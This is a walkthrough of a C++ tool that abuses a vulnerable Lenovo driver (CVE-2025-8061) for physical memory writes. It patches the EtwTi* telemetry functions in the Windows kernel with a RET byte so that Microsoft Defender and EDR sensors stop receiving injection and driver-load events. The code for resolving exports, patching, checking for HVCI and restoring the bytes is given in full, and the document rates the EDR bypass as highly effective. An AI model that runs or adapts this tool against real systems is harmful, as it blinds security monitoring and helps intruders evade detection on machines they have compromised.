# 08 — ETW-TI Patch (Event Tracing for Windows — Threat Intelligence)

**File:** `08_etw_patch.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive used:** Physical read/write (1 byte) + Kernel VA read  
**Output:** Patch `EtwTi*` functions with `0xC3` (RET), blind ETW telemetry

---

## Objective

Patch the `EtwTi*` functions in ntoskrnl.exe with `0xC3` (x64 RET instruction). These functions are the telemetry source for Microsoft Defender, ETW-based EDR sensors, and Process Monitor. After patching: events are no longer emitted.

---

## Background Theory

### What is ETW-TI?

`ETW` (Event Tracing for Windows) is the Windows kernel logging infrastructure. `ETW-TI` (Threat Intelligence) is a set of special providers inside ntoskrnl that Microsoft Defender and other security products subscribe to in order to receive events about:

| Function | Events |
|----------|--------|
| `EtwTiLogReadWriteVm` | Process VM read/write (injection detection) |
| `EtwTiLogAllocFreeVm` | VirtualAlloc/Free in another process (shellcode injection) |
| `EtwTiLogMapUnmapView` | MapViewOfSection events (mapping-based injection) |
| `EtwTiLogCreateUserThread` | CreateRemoteThread detection |
| `EtwTiLogProtectExec` | VirtualProtect changing a region to executable |
| `EtwTiLogDriverLoad` | Driver load events |

### Patch technique: writing 0xC3 = RET

`0xC3` is the opcode for the `RET` instruction (x64 near return). If we write this byte to the very first byte of a function, the function returns immediately without doing anything — the event is never emitted.

This is **.text patching** — writing into the code section. This is why the technique is **riskier** than data-only techniques:
- HVCI (Hypervisor-Protected Code Integrity) protects .text pages with EPT → writes are silently discarded
- PatchGuard may detect changes to .text on certain builds

### Locating the EtwTi* functions

These functions are exported from ntoskrnl. We use the Export Directory of ntoskrnl to resolve the VA of each function, then call `VaToPa` to obtain the PA and write.

---

## Code Walkthrough

### PatchEntry struct

```cpp
struct PatchEntry {
    const char *name;      // function name
    uint64_t    func_va;   // kernel VA
    uint64_t    func_pa;   // physical address of the first byte
    uint8_t     orig_byte; // original byte (for restore)
    bool        patched;   // successfully patched?
};
static PatchEntry g_patches[8];
static int        g_patch_count = 0;
```

Saves state for restoration.

### List of targets

```cpp
static const char *s_etw_targets[] = {
    "EtwTiLogReadWriteVm",
    "EtwTiLogAllocFreeVm",
    "EtwTiLogMapUnmapView",
    "EtwTiLogCreateUserThread",
    "EtwTiLogProtectExec",
    "EtwTiLogDriverLoad",
    nullptr
};
```

### GetNtExport() — resolve export via Export Directory

```cpp
static uint64_t GetNtExport(uint64_t cr3, uint64_t ntos_base, const char *name)
{
    uint8_t hdrbuf[0x1000] = {};
    KernelRead(cr3, ntos_base, hdrbuf, sizeof(hdrbuf));  // read PE header

    auto *dos = (IMAGE_DOS_HEADER*)hdrbuf;
    auto *nt  = (IMAGE_NT_HEADERS64*)(hdrbuf + dos->e_lfanew);

    // DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT] = Export directory
    auto &dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    DWORD expSize = (dir.Size < 0x80000u) ? dir.Size : 0x80000u;
    
    // Allocate buffer and read the entire export section
    auto *expbuf = (uint8_t*)VirtualAlloc(nullptr, expSize + 0x1000, ...);
    KernelRead(cr3, ntos_base + dir.VirtualAddress, expbuf, expSize);
    
    auto *exp = (IMAGE_EXPORT_DIRECTORY*)expbuf;
    DWORD base_rva = dir.VirtualAddress;  // base for computing offsets into expbuf
```

Technique: we read the entire export section into a user buffer, then parse locally. This avoids many small `KernelRead` calls.

```cpp
    for (DWORD i = 0; i < exp->NumberOfNames && !result; i++) {
        // AddressOfNames is an array of RVAs to name strings
        DWORD offN = exp->AddressOfNames - base_rva + i * 4;
        DWORD nameRva = *(DWORD*)(expbuf + offN);
        DWORD nameOff = nameRva - base_rva;
        
        if (_stricmp((char*)(expbuf + nameOff), name) != 0) continue;
        // Name matched!
        
        // Get ordinal from AddressOfNameOrdinals
        DWORD offO = exp->AddressOfNameOrdinals - base_rva + i * 2;
        WORD ord = *(WORD*)(expbuf + offO);
        
        // Use ordinal to index AddressOfFunctions
        DWORD offF = exp->AddressOfFunctions - base_rva + (DWORD)ord * 4;
        DWORD funcRva = *(DWORD*)(expbuf + offF);
        result = ntos_base + funcRva;  // kernel VA = base + RVA
```

### HVCI Detection

```cpp
// After patching all functions, check whether any write stuck
int stuck = 0;
for (int i = 0; i < g_patch_count; i++) {
    if (g_patches[i].patched) stuck++;
}

if (stuck == 0 && g_patch_count > 0) {
    printf("[!] HVCI DETECTED: zero writes stuck. Physical writes to .text\n");
    printf("    are silently discarded by the hypervisor's EPT.\n");
    printf("    This technique does NOT work with HVCI enabled.\n");
}
```

If we write 0xC3 to 6 functions but all readbacks still show the original byte → HVCI discarded everything → detected.

### Patch loop

```cpp
for (int t = 0; s_etw_targets[t]; t++) {
    PatchEntry &pe = g_patches[g_patch_count];
    pe.name = s_etw_targets[t];
    
    // Resolve VA
    pe.func_va = GetNtExport(cr3, nt.base, pe.name);
    if (!pe.func_va) {
        printf("    [-] %s not found\n", pe.name);
        continue;
    }
    
    // Get PA
    pe.func_pa = VaToPa(cr3, pe.func_va);
    if (!pe.func_pa) continue;
    
    // Read original byte
    pe.orig_byte = 0xFF;
    uint8_t rb[1]; PhysRead(pe.func_pa, rb, 1);
    pe.orig_byte = rb[0];
    
    // Write 0xC3 (RET)
    PhysWriteU8(pe.func_pa, 0xC3);
    
    // Readback verify
    uint8_t rb2[1]; PhysRead(pe.func_pa, rb2, 1);
    pe.patched = (rb2[0] == 0xC3);
    
    printf("    %s: orig=0x%02X → 0xC3 %s\n",
           pe.name, pe.orig_byte,
           pe.patched ? "[OK]" : "[FAILED - HVCI?]");
    
    if (pe.patched) g_patch_count++;
}
```

### RestoreAll()

```cpp
static void RestoreAll(uint64_t cr3)
{
    printf("[*] Restoring all patched bytes...\n");
    int restored = 0;
    for (int i = 0; i < g_patch_count; i++) {
        if (!g_patches[i].patched) continue;
        
        // Re-resolve PA (page table may have changed if time has elapsed)
        uint64_t pa = VaToPa(cr3, g_patches[i].func_va);
        if (!pa) pa = g_patches[i].func_pa;  // fallback
        
        if (PhysWriteU8(pa, g_patches[i].orig_byte)) {
            printf("    Restored %s (0x%02X)\n", g_patches[i].name, g_patches[i].orig_byte);
            restored++;
        }
    }
    printf("[+] %d/%d functions restored\n", restored, g_patch_count);
}
```

### User interaction with countdown

```cpp
printf("[*] Press Enter to RESTORE all patched bytes and exit...\n");
printf("    WARNING: PatchGuard MAY detect .text modifications.\n");
printf("    Do not leave patches active for extended periods.\n");
getchar();
// User presses Enter → restore immediately
```

Unlike `05_dse_bypass.cpp` (fixed 5-second countdown), here the user controls when to restore because this is a patching demo, not a short-window operation like DSE.

---

## Risk Assessment

### PatchGuard risk

PatchGuard verifies the code integrity of kernel modules on a randomized timer. Patching .text bytes of ntoskrnl may be detected → BSOD 0x109. However:
- `EtwTi*` functions are not in PatchGuard's protected set on all builds
- Some Win11 22H2-26100 builds do not detect patching of these small functions
- If the function is just `0xC3` + epilogue, a signature match may still pass

**There is no guarantee** — this technique carries a BSOD risk.

### HVCI risk

If HVCI is enabled: writes are discarded → technique is ineffective. The code detects and reports this.

---

## Stability Summary

| Issue | Severity |
|-------|----------|
| **PatchGuard** | **RISKY** — may detect .text patch, BSOD 0x109 |
| **HVCI** | **BLOCKED** — writes discarded, detected via readback |
| BSOD if function is patched mid-execution | Low — 1-byte write is atomic |
| EDR bypass effectiveness | High — major telemetry source disabled |

---

## Flow Summary

```
GetSystemCR3() → cr3
GetNtoskrnlInfo(cr3) → nt.base, .text/.data bounds

For each EtwTi* function:
    GetNtExport(cr3, nt.base, name) → func_va
    VaToPa(cr3, func_va) → func_pa
    PhysRead(func_pa, 1 byte) → orig_byte (save!)
    PhysWriteU8(func_pa, 0xC3)
    PhysRead verify → patched? or HVCI blocked?

[*] Press Enter...

RestoreAll():
    For each patched function:
        PhysWriteU8(func_pa, orig_byte)
```
